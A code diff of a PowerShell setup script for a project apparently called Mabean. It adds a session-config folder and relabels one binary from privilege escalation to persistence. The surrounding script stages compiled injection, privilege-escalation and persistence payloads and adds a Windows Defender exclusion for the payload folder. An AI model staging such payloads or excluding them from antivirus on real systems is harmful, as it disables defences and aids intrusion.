@@ -23,6 +23,8 @@ $chain = Join-Path $dataDir "Chain"
 
 $logs = Join-Path $dataDir "Logs"
 
+$sessionConfigDir = Join-Path $dataDir "SessionConfig"
+
 
 if (-Not (Test-Path $mabeanDir)) {
     New-Item -ItemType Directory -Path $mabeanDir | Out-Null
@@ -56,6 +58,10 @@ if (-Not (Test-Path $logs)) {
     New-Item -ItemType Directory -Path $logs | Out-Null
 }
 
+if (-Not (Test-Path $sessionConfigDir)) {
+    New-Item -ItemType Directory -Path $sessionConfigDir | Out-Null
+}
+
 if (-Not (Test-Path $keyBinPath)) {
     $key = New-Object byte[] 32
     $rng = [System.Security.Cryptography.RNGCryptoServiceProvider]::new()
@@ -65,7 +71,7 @@ if (-Not (Test-Path $keyBinPath)) {
 
 Copy-Item "$PSScriptRoot\MabeanScripts\Injection\1\x64\Release\1.dll" -Destination (Join-Path $dlls "1.dll")  -Force
 Copy-Item "$PSScriptRoot\MabeanScripts\PrivilegeEscalation\2\x64\Release\2.dll" -Destination (Join-Path $dlls "2.dll")  -Force
-Copy-Item "$PSScriptRoot\MabeanScripts\PrivilegeEscalation\3\x64\Release\3.exe" -Destination (Join-Path $executables "3.exe")  -Force
+Copy-Item "$PSScriptRoot\MabeanScripts\Persistence\3\x64\Release\3.exe" -Destination (Join-Path $executables "3.exe")  -Force
 Copy-Item "$PSScriptRoot\MabeanMarker.exe" -Destination (Join-Path $dataDir "MabeanMarker.exe")  -Force
 
 Set-MpPreference -ExclusionPath $payloadsDir
